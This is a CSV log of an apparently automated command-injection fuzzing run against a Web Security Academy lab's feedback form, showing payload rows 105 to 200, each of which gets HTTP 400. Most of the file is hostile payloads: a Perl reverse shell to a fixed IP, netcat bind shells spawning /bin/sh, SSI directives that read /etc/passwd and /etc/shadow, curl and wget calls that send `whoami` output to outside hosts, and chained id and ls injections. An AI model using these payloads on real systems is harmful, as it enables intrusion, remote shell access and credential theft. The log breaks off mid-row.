id_fuzz_1,105,"& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,106,"&& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,107,"echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,108,() { :;}; echo vulnerable 10,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,109,eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,110,eval('ls'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,111,eval('pwd'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,112,eval('pwd');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,113,eval('sleep 5'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,114,eval('sleep 5');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,115,eval('whoami'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,116,eval('whoami');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,117,exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,118,exec('ls'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,119,exec('pwd'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,120,exec('pwd');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,121,exec('sleep 5'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,122,exec('sleep 5');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,123,exec('whoami'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,124,exec('whoami');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,125,";{$_GET[""cmd""]}",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,126,`id`,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,127,|id,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,128,| id,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,129,;id,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,130,;id|,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,131,;id;,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,132,& id,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,133,&&id,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,134,";id
",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,135,ifconfig,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,136,| ifconfig,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,137,; ifconfig,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,138,& ifconfig,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,139,&& ifconfig,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,140,/index.html|id|,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,141,ipconfig,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,142,| ipconfig /all,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,143,; ipconfig /all,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,144,& ipconfig /all,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,145,&& ipconfig /all,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,146,ipconfig /all,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,147,ls,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,148,$(`ls`),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,149,| ls -l /,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,150,; ls -l /,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,151,& ls -l /,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,152,&& ls -l /,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,153,ls -l /,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,154,| ls -laR /etc,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,155,; ls -laR /etc,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,156,& ls -laR /etc,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,157,&& ls -laR /etc,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,158,| ls -laR /var/www,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,159,; ls -laR /var/www,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,160,& ls -laR /var/www,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,161,&& ls -laR /var/www,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,162,| ls -l /etc/,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,163,; ls -l /etc/,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,164,& ls -l /etc/,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,165,&& ls -l /etc/,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,166,ls -l /etc/,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,167,ls -lh /etc/,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,168,| ls -l /home/*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,169,; ls -l /home/*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,170,& ls -l /home/*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,171,&& ls -l /home/*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,172,ls -l /home/*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,173,*; ls -lhtR /var/www/,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,174,| ls -l /tmp,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,175,; ls -l /tmp,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,176,& ls -l /tmp,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,177,&& ls -l /tmp,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,178,ls -l /tmp,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,179,| ls -l /var/www/*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,180,; ls -l /var/www/*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,181,& ls -l /var/www/*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,182,&& ls -l /var/www/*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,183,ls -l /var/www/*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,184,"<!--#exec cmd=""/bin/cat /etc/passwd""-->",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,185,"<!--#exec cmd=""/bin/cat /etc/shadow""-->",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,186,"<!--#exec cmd=""/usr/bin/id;-->",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,187,"
",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,188,"
\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,189,"
\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,190,"
/bin/ls -al
",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,191,| nc -lvvp 4444 -e /bin/sh|,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,192,; nc -lvvp 4444 -e /bin/sh;,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,193,& nc -lvvp 4444 -e /bin/sh&,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,194,&& nc -lvvp 4444 -e /bin/sh &,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,195,nc -lvvp 4444 -e /bin/sh,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,196,nc -lvvp 4445 -e /bin/sh &,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,197,nc -lvvp 4446 -e /bin/sh|,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,198,nc -lvvp 4447 -e /bin/sh;,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,199,nc -lvvp 4448 -e /bin/sh&,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,200,"
echo INJECTX
exit
\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt
